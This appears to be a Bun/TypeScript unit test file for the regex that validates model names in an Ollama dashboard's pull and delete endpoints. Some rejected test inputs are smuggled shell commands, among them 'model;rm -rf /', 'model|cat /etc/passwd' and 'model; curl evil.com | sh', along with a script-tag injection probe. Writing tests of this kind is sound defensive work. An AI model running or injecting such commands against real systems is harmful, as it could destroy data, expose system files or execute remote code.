import { describe, test, expect } from "bun:test";

/**
 * Tests for the Ollama dashboard API route validation logic.
 *
 * The routes live in src/channels/webchat.ts inside handleDashboardApi().
 * Since those routes are deeply embedded in the HTTP handler and depend on
 * a running Ollama instance, we test the validation regex directly.
 *
 * The regex used in both the pull and delete endpoints:
 *   /^[a-zA-Z0-9._:\/-]+$/
 */
const validModelName = /^[a-zA-Z0-9._:\/-]+$/;

/**
 * Helper that mirrors the validation logic from the pull/delete routes:
 *   if (!body.name || !/^[a-zA-Z0-9._:\/-]+$/.test(body.name)) → 400
 */
function isValidModelName(name: string | undefined | null): boolean {
  if (!name) return false;
  return validModelName.test(name);
}

describe("Ollama Dashboard Routes — Model Name Validation", () => {
  // ── Valid model names ──

  describe("accepts valid model names", () => {
    test("simple model name: llama3.3", () => {
      expect(isValidModelName("llama3.3")).toBe(true);
    });

    test("model with tag: qwen2.5-coder:32b", () => {
      expect(isValidModelName("qwen2.5-coder:32b")).toBe(true);
    });

    test("library/model:tag format", () => {
      expect(isValidModelName("library/model:tag")).toBe(true);
    });

    test("simple single-word name: mistral", () => {
      expect(isValidModelName("mistral")).toBe(true);
    });

    test("name with dots: ggml-base.en.bin", () => {
      expect(isValidModelName("ggml-base.en.bin")).toBe(true);
    });

    test("name with numbers: llama3", () => {
      expect(isValidModelName("llama3")).toBe(true);
    });

    test("name with hyphens: codellama-7b", () => {
      expect(isValidModelName("codellama-7b")).toBe(true);
    });

    test("name with slashes: meta/llama3:latest", () => {
      expect(isValidModelName("meta/llama3:latest")).toBe(true);
    });

    test("name with underscore: my_model", () => {
      expect(isValidModelName("my_model")).toBe(true);
    });

    test("complex valid name: registry.example.com/org/model:v1.2.3", () => {
      expect(isValidModelName("registry.example.com/org/model:v1.2.3")).toBe(true);
    });

    test("name with only numbers: 1234", () => {
      expect(isValidModelName("1234")).toBe(true);
    });
  });

  // ── Invalid model names ──

  describe("rejects invalid model names", () => {
    test("empty string", () => {
      expect(isValidModelName("")).toBe(false);
    });

    test("undefined", () => {
      expect(isValidModelName(undefined)).toBe(false);
    });

    test("null", () => {
      expect(isValidModelName(null)).toBe(false);
    });

    test("spaces in name", () => {
      expect(isValidModelName("my model")).toBe(false);
    });

    test("leading space", () => {
      expect(isValidModelName(" llama3")).toBe(false);
    });

    test("trailing space", () => {
      expect(isValidModelName("llama3 ")).toBe(false);
    });

    test("shell metacharacter: semicolon", () => {
      expect(isValidModelName("model;rm -rf /")).toBe(false);
    });

    test("shell metacharacter: pipe", () => {
      expect(isValidModelName("model|cat /etc/passwd")).toBe(false);
    });

    test("shell metacharacter: backtick", () => {
      expect(isValidModelName("`whoami`")).toBe(false);
    });

    test("shell metacharacter: dollar sign", () => {
      expect(isValidModelName("$HOME")).toBe(false);
    });

    test("shell metacharacter: ampersand", () => {
      expect(isValidModelName("model&echo hi")).toBe(false);
    });

    test("special chars: curly braces", () => {
      expect(isValidModelName("model{bad}")).toBe(false);
    });

    test("special chars: parentheses", () => {
      expect(isValidModelName("model(bad)")).toBe(false);
    });

    test("special chars: square brackets", () => {
      expect(isValidModelName("model[bad]")).toBe(false);
    });

    test("newline injection", () => {
      expect(isValidModelName("model\nmalicious")).toBe(false);
    });

    test("tab character", () => {
      expect(isValidModelName("model\tname")).toBe(false);
    });

    test("double quotes", () => {
      expect(isValidModelName('"model"')).toBe(false);
    });

    test("single quotes", () => {
      expect(isValidModelName("'model'")).toBe(false);
    });

    test("angle brackets (HTML injection)", () => {
      expect(isValidModelName("<script>alert(1)</script>")).toBe(false);
    });

    test("hash character", () => {
      expect(isValidModelName("model#tag")).toBe(false);
    });

    test("question mark", () => {
      expect(isValidModelName("model?version=1")).toBe(false);
    });

    test("at sign", () => {
      expect(isValidModelName("user@model")).toBe(false);
    });

    test("exclamation mark", () => {
      expect(isValidModelName("model!")).toBe(false);
    });

    test("percent sign", () => {
      expect(isValidModelName("model%20name")).toBe(false);
    });
  });

  // ── Endpoint-level validation ──

  describe("pull endpoint requires name field", () => {
    test("missing name fails validation", () => {
      const body: { name?: string } = {};
      const valid = isValidModelName(body.name);
      expect(valid).toBe(false);
    });

    test("present valid name passes validation", () => {
      const body = { name: "llama3.3" };
      const valid = isValidModelName(body.name);
      expect(valid).toBe(true);
    });

    test("present but empty name fails validation", () => {
      const body = { name: "" };
      const valid = isValidModelName(body.name);
      expect(valid).toBe(false);
    });
  });

  describe("delete endpoint requires name field", () => {
    test("missing name fails validation", () => {
      const body: { name?: string } = {};
      const valid = isValidModelName(body.name);
      expect(valid).toBe(false);
    });

    test("present valid name passes validation", () => {
      const body = { name: "qwen2.5-coder:32b" };
      const valid = isValidModelName(body.name);
      expect(valid).toBe(true);
    });

    test("present but malicious name fails validation", () => {
      const body = { name: "model; curl evil.com | sh" };
      const valid = isValidModelName(body.name);
      expect(valid).toBe(false);
    });
  });
});
